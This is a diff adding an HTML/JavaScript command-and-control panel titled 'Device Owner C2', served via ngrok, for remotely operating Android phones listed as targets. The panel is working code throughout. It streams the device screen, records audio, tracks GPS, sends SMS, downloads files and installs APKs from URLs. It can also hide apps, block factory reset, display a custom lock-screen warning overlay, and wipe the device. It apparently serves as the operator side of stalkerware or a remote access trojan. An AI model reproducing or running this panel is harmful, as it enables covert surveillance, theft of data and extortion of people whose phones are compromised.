@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Device Owner C2 - Control Center</title>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --accent: #38bdf8;
+            --danger: #ef4444;
+            --success: #22c55e;
+            --text-main: #f1f5f9;
+            --text-dim: #94a3b8;
+            --border: #334155;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 10px;
+            background: var(--bg-dark);
+            color: var(--text-main);
+            line-height: 1.5;
+        }
+
+        .container { max-width: 1200px; margin: 0 auto; }
+
+        header {
+            text-align: center;
+            padding: 20px 0;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            color: var(--accent);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            padding: 16px;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        h2 {
+            margin-top: 0;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+        }
+
+        .control-group {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border);
+            gap: 10px;
+        }
+
+        .control-group:last-child { border-bottom: none; }
+
+        label { font-size: 0.85rem; color: var(--text-dim); font-weight: 500; }
+
+        .btn-toggle { display: flex; gap: 6px; }
+
+        button {
+            padding: 8px 12px;
+            cursor: pointer;
+            background: #334155;
+            color: white;
+            border: 1px solid transparent;
+            border-radius: 6px;
+            transition: all 0.2s;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        button.active-on {
+            background: var(--success);
+            box-shadow: 0 0 12px rgba(34, 197, 94, 0.3);
+        }
+
+        button.active-off {
+            background: var(--danger);
+            box-shadow: 0 0 12px rgba(239, 68, 68, 0.3);
+        }
+
+        button.action {
+            background: var(--accent);
+            color: #0f172a;
+        }
+
+        button:active { transform: scale(0.97); }
+
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        input, select {
+            padding: 8px;
+            border-radius: 6px;
+            border: 1px solid var(--border);
+            background: #0f172a;
+            color: white;
+            font-size: 0.85rem;
+            width: 100%;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+        }
+
+        pre {
+            background: #000;
+            padding: 12px;
+            border-radius: 8px;
+            overflow-x: auto;
+            color: #10b981;
+            font-size: 11px;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            max-height: 250px;
+            border: 1px solid #064e3b;
+        }
+
+        .live-screen {
+            width: 100%;
+            border-radius: 8px;
+            background: #000;
+            margin-top: 10px;
+            aspect-ratio: 9/16;
+            object-fit: contain;
+            border: 1px solid var(--border);
+        }
+
+        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; }
+        .status-online { background-color: var(--success); box-shadow: 0 0 8px var(--success); }
+        .status-offline { background-color: var(--danger); box-shadow: 0 0 8px var(--danger); }
+
+        .device-selector {
+            margin-bottom: 20px;
+            padding: 16px;
+            background: var(--card-bg);
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            border: 1px solid var(--border);
+        }
+
+        @media (min-width: 640px) {
+            .device-selector { flex-direction: row; align-items: center; }
+            .device-selector > div:first-child { flex: 1; }
+            h1 { font-size: 2rem; }
+        }
+
+        .active-id-badge {
+            background: var(--accent);
+            color: #0f172a;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 700;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        #errorLog {
+            color: #fca5a5;
+            background: rgba(127, 29, 29, 0.4);
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            display: none;
+            border: 1px solid #7f1d1d;
+            font-size: 0.85rem;
+        }
+
+        hr { border: 0; border-top: 1px solid var(--border); margin: 15px 0; }
+
+        .vibrate-box { display: flex; gap: 8px; }
+        .vibrate-box input { flex: 1; }
+        .vibrate-box button { flex: 0 0 auto; }
+
+        .flex-row { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; }
+        .flex-row input { flex: 1; }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>
+                <span id="connectionStatus" class="status-dot status-offline"></span>
+                Terminal C2
+            </h1>
+        </header>
+
+        <div id="errorLog"></div>
+
+        <div class="device-selector">
+            <div>
+                <label style="display:block; margin-bottom:5px;">Select Target Device</label>
+                <select id="deviceSelect" onchange="fetchDeviceData()">
+                    <option value="">-- Connecting to Server... --</option>
+                </select>
+            </div>
+            <div style="display: flex; gap: 10px; align-items: center;">
+                <button class="action" onclick="loadDevices()">Refresh</button>
+                <div id="activeDeviceInfo" style="display: none;">
+                    <span id="displayDeviceId" class="active-id-badge">None</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="controls" style="display: none;">
+            <div class="grid">
+                <!-- Live Monitoring -->
+                <div class="card">
+                    <h2>Live View</h2>
+                    <div class="btn-toggle">
+                        <button class="action" style="flex:1" onclick="sendCommand('start_screen_capture')">Start Stream</button>
+                        <button style="flex:1" onclick="sendCommand('stop_screen_capture')">Stop</button>
+                    </div>
+                    <img id="liveScreen" class="live-screen" src="" alt="Stream Offline" />
+                </div>
+
+                <!-- Immediate Actions -->
+                <div class="card">
+                    <h2>Quick Actions</h2>
+                    <button class="active-off" style="width: 100%; margin-bottom: 12px; padding: 12px;" onclick="sendCommand('lock')">LOCK DEVICE</button>
+                    <div class="btn-toggle" style="margin-bottom: 12px;">
+                        <button class="action" style="flex: 1;" onclick="safeReboot()">REBOOT</button>
+                        <button style="flex: 1; background: #991b1b;" onclick="safeWipe()">WIPE</button>
+                    </div>
+                    <hr>
+                    <label>Force Vibration</label>
+                    <div class="vibrate-box" style="margin-top:5px;">
+                        <input type="number" id="vibDur" placeholder="ms" value="1000">
+                        <button class="action" onclick="sendCommand('vibrate', {duration: parseInt(document.getElementById('vibDur').value)})">Vibrate</button>
+                    </div>
+                </div>
+
+                <!-- App Management -->
+                <div class="card">
+                    <h2>App Management</h2>
+                    <div class="flex-row">
+                        <input type="text" id="targetPackage" placeholder="com.package.name">
+                        <button onclick="sendCommand('list_apps')">List</button>
+                    </div>
+                    <div class="btn-toggle" style="margin-bottom: 8px;">
+                        <button style="flex:1" onclick="sendCommand('hide_app', {packageName: document.getElementById('targetPackage').value, hidden: true})">Hide</button>
+                        <button style="flex:1" onclick="sendCommand('hide_app', {packageName: document.getElementById('targetPackage').value, hidden: false})">Unhide</button>
+                    </div>
+                    <div class="btn-toggle">
+                        <button style="flex:1" onclick="sendCommand('package_suspend', {packageName: document.getElementById('targetPackage').value, suspended: true})">Suspend</button>
+                        <button style="flex:1" onclick="sendCommand('package_suspend', {packageName: document.getElementById('targetPackage').value, suspended: false})">Resume</button>
+                    </div>
+                    <hr>
+                    <label>Install APK URL</label>
+                    <div class="flex-row">
+                        <input type="text" id="apkUrl" placeholder="https://example.com/app.apk">
+                        <button class="action" onclick="sendCommand('install_app', {url: document.getElementById('apkUrl').value})">Install</button>
+                    </div>
+                </div>
+
+                <!-- Messaging & Media -->
+                <div class="card">
+                    <h2>Comms & Media</h2>
+                    <label>Send SMS</label>
+                    <div class="flex-row">
+                        <input type="text" id="smsNumber" placeholder="Number" style="flex:0.4">
+                        <input type="text" id="smsMsg" placeholder="Message">
+                        <button class="action" onclick="sendCommand('sms', {number: document.getElementById('smsNumber').value, message: document.getElementById('smsMsg').value})">Send</button>
+                    </div>
+                    <hr>
+                    <label>Record Audio</label>
+                    <div class="flex-row">
+                        <input type="number" id="recDur" value="10000" placeholder="ms">
+                        <button class="action" onclick="sendCommand('record_audio', {duration: parseInt(document.getElementById('recDur').value)})">Record</button>
+                    </div>
+                    <hr>
+                    <button class="action" style="width: 100%;" onclick="sendCommand('location')">GET GPS LOCATION</button>
+                </div>
+
+                <!-- Hardware Control -->
+                <div class="card">
+                    <h2>Hardware Control</h2>
+                    <div class="control-group">
+                        <label>Camera Access</label>
+                        <div class="btn-toggle">
+                            <button id="btn_camera_allow" onclick="sendCommand('camera', {disabled: false})">Allow</button>
+                            <button id="btn_camera_block" onclick="sendCommand('camera', {disabled: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Location Services</label>
+                        <div class="btn-toggle">
+                            <button id="btn_location_allow" onclick="sendCommand('location_disable', {disabled: false})">Allow</button>
+                            <button id="btn_location_block" onclick="sendCommand('location_disable', {disabled: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Wi-Fi Modification</label>
+                        <div class="btn-toggle">
+                            <button id="btn_wifi_allow" onclick="sendCommand('wifi_disable', {disabled: false})">Allow</button>
+                            <button id="btn_wifi_block" onclick="sendCommand('wifi_disable', {disabled: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Bluetooth</label>
+                        <div class="btn-toggle">
+                            <button id="btn_bluetooth_allow" onclick="sendCommand('bluetooth_disable', {disabled: false})">Allow</button>
+                            <button id="btn_bluetooth_block" onclick="sendCommand('bluetooth_disable', {disabled: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Flashlight</label>
+                        <div class="btn-toggle">
+                            <button id="btn_flashlight_on" onclick="sendCommand('flashlight', {enabled: true})">ON</button>
+                            <button id="btn_flashlight_off" onclick="sendCommand('flashlight', {enabled: false})">OFF</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- System Security -->
+                <div class="card">
+                    <h2>System Policies</h2>
+                    <div class="control-group">
+                        <label>Google Services</label>
+                        <div class="btn-toggle">
+                            <button id="btn_google_allow" onclick="sendCommand('google_services', {block: false})">Allow</button>
+                            <button id="btn_google_block" onclick="sendCommand('google_services', {block: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Accounts</label>
+                        <div class="btn-toggle">
+                            <button id="btn_accounts_allow" onclick="sendCommand('account_management_disable', {disabled: false})">Allow</button>
+                            <button id="btn_accounts_block" onclick="sendCommand('account_management_disable', {disabled: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Factory Reset</label>
+                        <div class="btn-toggle">
+                            <button id="btn_factory_allow" onclick="sendCommand('factory_reset_block', {block: false})">Allow</button>
+                            <button id="btn_factory_block" onclick="sendCommand('factory_reset_block', {block: true})">Block</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Update Policy</label>
+                        <select id="updatePolicy" style="width: auto;" onchange="sendCommand('system_update_policy', {type: this.value})">
+                            <option value="DEFAULT">Default</option>
+                            <option value="AUTOMATIC">Auto</option>
+                            <option value="POSTPONE">Postpone</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Display & Branding -->
+                <div class="card">
+                    <h2>Device Settings</h2>
+                    <label>Brightness</label>
+                    <input type="range" min="0" max="255" value="128" oninput="sendCommand('set_brightness', {brightness: parseInt(this.value)})">
+                    <hr>
+                    <div class="control-group">
+                        <label>Stay On (Plugged)</label>
+                        <div class="btn-toggle">
+                            <button id="btn_stayon_on" onclick="sendCommand('stay_on', {enabled: true})">ON</button>
+                            <button id="btn_stayon_off" onclick="sendCommand('stay_on', {enabled: false})">OFF</button>
+                        </div>
+                    </div>
+                    <hr>
+                    <label>Organization Name</label>
+                    <div class="flex-row">
+                        <input type="text" id="orgName" placeholder="Managed by IT">
+                        <button class="action" onclick="sendCommand('set_org_name', {name: document.getElementById('orgName').value})">Set</button>
+                    </div>
+                </div>
+
+                <!-- Overlay Control -->
+                <div class="card">
+                    <h2>Lock Overlay</h2>
+                    <div class="flex-row" style="flex-direction: column;">
+                        <input type="text" id="overlayText" placeholder="Custom Warning Message">
+                        <input type="text" id="overlayImage" placeholder="Image URL (Direct link)">
+                    </div>
+                    <div class="btn-toggle">
+                        <button class="action" style="flex: 1;" onclick="sendCommand('show_overlay', {text: document.getElementById('overlayText').value, imageUrl: document.getElementById('overlayImage').value})">SHOW</button>
+                        <button style="flex: 1;" onclick="sendCommand('hide_overlay')">HIDE</button>
+                    </div>
+                </div>
+
+                <!-- UI Restrictions -->
+                <div class="card">
+                    <h2>UI & Kiosk</h2>
+                    <div class="control-group">
+                        <label>Status Bar</label>
+                        <div class="btn-toggle">
+                            <button id="btn_statusbar_allow" onclick="sendCommand('status_bar_disable', {disabled: false})">ON</button>
+                            <button id="btn_statusbar_block" onclick="sendCommand('status_bar_disable', {disabled: true})">OFF</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Lockscreen</label>
+                        <div class="btn-toggle">
+                            <button id="btn_keyguard_allow" onclick="sendCommand('keyguard_disable', {disabled: false})">ON</button>
+                            <button id="btn_keyguard_block" onclick="sendCommand('keyguard_disable', {disabled: true})">OFF</button>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label>Kiosk Mode</label>
+                        <div class="btn-toggle">
+                            <button id="btn_kiosk_on" onclick="sendCommand('kiosk_mode', {enabled: true})">ON</button>
+                            <button id="btn_kiosk_off" onclick="sendCommand('kiosk_mode', {enabled: false})">OFF</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- File Manager -->
+                <div class="card">
+                    <h2>File Manager</h2>
+                    <label>Path</label>
+                    <div class="flex-row">
+                        <input type="text" id="filePath" placeholder="/sdcard/">
+                        <button onclick="sendCommand('list_files', {path: document.getElementById('filePath').value})">List</button>
+                    </div>
+                    <button class="action" style="width: 100%;" onclick="sendCommand('download_file', {path: document.getElementById('filePath').value})">Download File</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                    <h2>System Data & Responses</h2>
+                    <span id="lastUpdated" style="font-size: 0.7rem; color: var(--text-dim);"></span>
+                </div>
+                <pre id="logs">Connecting...</pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const NGROK_HEADERS = { 'ngrok-skip-browser-warning': 'true' };
+        let lastCommandTimestamp = 0;
+        const SYNC_COOLDOWN = 8000;
+
+        function showError(msg) {
+            const el = document.getElementById('errorLog');
+            el.innerText = msg;
+            el.style.display = 'block';
+        }
+
+        function hideError() {
+            document.getElementById('errorLog').style.display = 'none';
+        }
+
+        async function loadDevices() {
+            try {
+                const select = document.getElementById('deviceSelect');
+                const res = await fetch('/get-all-devices?t=' + Date.now(), { headers: NGROK_HEADERS });
+                if (!res.ok) throw new Error('Server returned ' + res.status);
+
+                const devices = await res.json();
+                const currentVal = select.value;
+                const ids = Object.keys(devices);
+
+                select.innerHTML = '<option value="">-- Select Target --</option>';
+                if (ids.length === 0) {
+                    select.innerHTML = '<option value="">-- No Active Targets --</option>';
+                    document.getElementById('activeDeviceInfo').style.display = 'none';
+                    return;
+                }
+
+                ids.forEach(id => {
+                    const opt = document.createElement('option');
+                    opt.value = id;
+                    const lastSeen = new Date(devices[id].lastSeen || 0).toLocaleTimeString();
+                    opt.innerText = `${devices[id].model || 'Unknown'} (${id.substring(0,6)}...) [${lastSeen}]`;
+                    select.appendChild(opt);
+                });
+
+                if (currentVal && devices[currentVal]) select.value = currentVal;
+                else if (ids.length === 1 && !currentVal) {
+                    select.value = ids[0];
+                    fetchDeviceData();
+                }
+            } catch (e) {
+                console.error("Error loading devices:", e);
+                document.getElementById('deviceSelect').innerHTML = '<option value="">-- Server Unreachable --</option>';
+            }
+        }
+
+        async function fetchDeviceData() {
+            const deviceId = document.getElementById('deviceSelect').value;
+            if (!deviceId) return;
+
+            // Optimistic UI check: Don't overwrite UI if we just sent a command
+            const isCoolingDown = (Date.now() - lastCommandTimestamp < SYNC_COOLDOWN);
+
+            document.getElementById('controls').style.display = 'block';
+            document.getElementById('activeDeviceInfo').style.display = 'block';
+            document.getElementById('displayDeviceId').innerText = deviceId;
+
+            try {
+                const res = await fetch(`/get-device-data?deviceId=${deviceId}&t=${Date.now()}`, { headers: NGROK_HEADERS });
+                if (!res.ok) throw new Error('Fetch error');
+
+                const data = await res.json();
+                if (data.status && data.status.deviceId) {
+                    document.getElementById('connectionStatus').className = 'status-dot status-online';
+
+                    // Update logs only if changed significantly to avoid "bar bar refresh" feel
+                    const newLog = JSON.stringify(data, null, 2);
+                    if (document.getElementById('logs').innerText !== newLog) {
+                        document.getElementById('logs').innerText = newLog;
+                        document.getElementById('lastUpdated').innerText = "Updated: " + new Date().toLocaleTimeString();
+                    }
+
+                    if (!isCoolingDown) {
+                        const s = data.status;
+                        updateButton('btn_camera_allow', 'btn_camera_block', s.cameraDisabled);
+                        updateButton('btn_location_allow', 'btn_location_block', s.locationDisabled);
+                        updateButton('btn_wifi_allow', 'btn_wifi_block', s.wifiDisabled);
+                        updateButton('btn_bluetooth_allow', 'btn_bluetooth_block', s.bluetoothDisabled);
+                        updateToggle('btn_flashlight_on', 'btn_flashlight_off', s.flashlight);
+                        updateButton('btn_google_allow', 'btn_google_block', s.googleBlocked);
+                        updateButton('btn_accounts_allow', 'btn_accounts_block', s.googleAccountDisabled);
+                        updateButton('btn_factory_allow', 'btn_factory_block', s.factoryResetBlocked);
+                        updateButton('btn_statusbar_allow', 'btn_statusbar_block', s.statusBarDisabled);
+                        updateButton('btn_keyguard_allow', 'btn_keyguard_block', s.keyguardDisabled);
+                        updateToggle('btn_kiosk_on', 'btn_kiosk_off', s.kioskModeEnabled);
+                        updateToggle('btn_stayon_on', 'btn_stayon_off', s.stayOnWhilePluggedIn);
+                        if (s.updatePolicy) document.getElementById('updatePolicy').value = s.updatePolicy;
+                    }
+                    hideError();
+                }
+            } catch (e) {
+                document.getElementById('connectionStatus').className = 'status-dot status-offline';
+            }
+        }
+
+        async function sendCommand(action, params = {}) {
+            const deviceId = document.getElementById('deviceSelect').value;
+            if (!deviceId) return alert("Select a device!");
+
+            // Optimistic UI updates
+            lastCommandTimestamp = Date.now();
+            try {
+                if (action === 'camera') updateButton('btn_camera_allow', 'btn_camera_block', params.disabled);
+                if (action === 'flashlight') updateToggle('btn_flashlight_on', 'btn_flashlight_off', params.enabled);
+                if (action === 'location_disable') updateButton('btn_location_allow', 'btn_location_block', params.disabled);
+                if (action === 'wifi_disable') updateButton('btn_wifi_allow', 'btn_wifi_block', params.disabled);
+                if (action === 'bluetooth_disable') updateButton('btn_bluetooth_allow', 'btn_bluetooth_block', params.disabled);
+                if (action === 'google_services') updateButton('btn_google_allow', 'btn_google_block', params.block);
+                if (action === 'account_management_disable') updateButton('btn_accounts_allow', 'btn_accounts_block', params.disabled);
+                if (action === 'factory_reset_block') updateButton('btn_factory_allow', 'btn_factory_block', params.block);
+                if (action === 'status_bar_disable') updateButton('btn_statusbar_allow', 'btn_statusbar_block', params.disabled);
+                if (action === 'keyguard_disable') updateButton('btn_keyguard_allow', 'btn_keyguard_block', params.disabled);
+                if (action === 'kiosk_mode') updateToggle('btn_kiosk_on', 'btn_kiosk_off', params.enabled);
+                if (action === 'stay_on') updateToggle('btn_stayon_on', 'btn_stayon_off', params.enabled);
+            } catch(e) {}
+
+            try {
+                const res = await fetch('/send-command', {
+                    method: 'POST',
+                    headers: { ...NGROK_HEADERS, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, action, params })
+                });
+                if (!res.ok) {
+                    const err = await res.json();
+                    throw new Error(err.error || res.status);
+                }
+            } catch (e) {
+                showError("Cmd Error: " + e.message);
+                lastCommandTimestamp = 0; // Reset so next fetch fixes UI
+                fetchDeviceData();
+            }
+        }
+
+        function safeReboot() {
+            if (confirm("Step 1/2: Are you sure you want to REBOOT the device?")) {
+                if (confirm("Step 2/2: Device will temporarily go offline. Proceed?")) {
+                    sendCommand('reboot');
+                }
+            }
+        }
+
+        function safeWipe() {
+            if (confirm("Step 1/3: CRITICAL WARNING! This will FACTORY RESET the device.")) {
+                if (confirm("Step 2/3: ALL DATA WILL BE DELETED PERMANENTLY. No recovery possible. Continue?")) {
+                    const confirmation = prompt("Step 3/3: To prevent accidental wipe, type 'PERMANENT WIPE' below:");
+                    if (confirmation === "PERMANENT WIPE") {
+                        sendCommand('wipe');
+                    } else {
+                        alert("Wipe cancelled. Confirmation text did not match.");
+                    }
+                }
+            }
+        }
+
+        function updateButton(idAllow, idBlock, isDisabled) {
+            const a = document.getElementById(idAllow), b = document.getElementById(idBlock);
+            if (!a || !b) return;
+            a.className = isDisabled ? '' : 'active-on';
+            b.className = isDisabled ? 'active-off' : '';
+        }
+
+        function updateToggle(idOn, idOff, isEnabled) {
+            const on = document.getElementById(idOn), off = document.getElementById(idOff);
+            if (!on || !off) return;
+            on.className = isEnabled ? 'active-on' : '';
+            off.className = isEnabled ? '' : 'active-off';
+        }
+
+        function updateLiveStream() {
+            const deviceId = document.getElementById('deviceSelect').value;
+            if (deviceId && document.getElementById('controls').style.display !== 'none') {
+                const img = document.getElementById('liveScreen');
+                // Use a temporary image to check if it exists before switching to avoid flickering
+                const tmp = new Image();
+                tmp.src = '/live-frame?deviceId=' + deviceId + '&t=' + Date.now();
+                tmp.onload = () => img.src = tmp.src;
+            }
+        }
+
+        // Intervals with staggered timing to avoid congestion
+        setInterval(loadDevices, 10000);
+        setInterval(fetchDeviceData, 4000);
+        setInterval(updateLiveStream, 2000);
+
+        loadDevices();
+    </script>
+</body>
+</html>
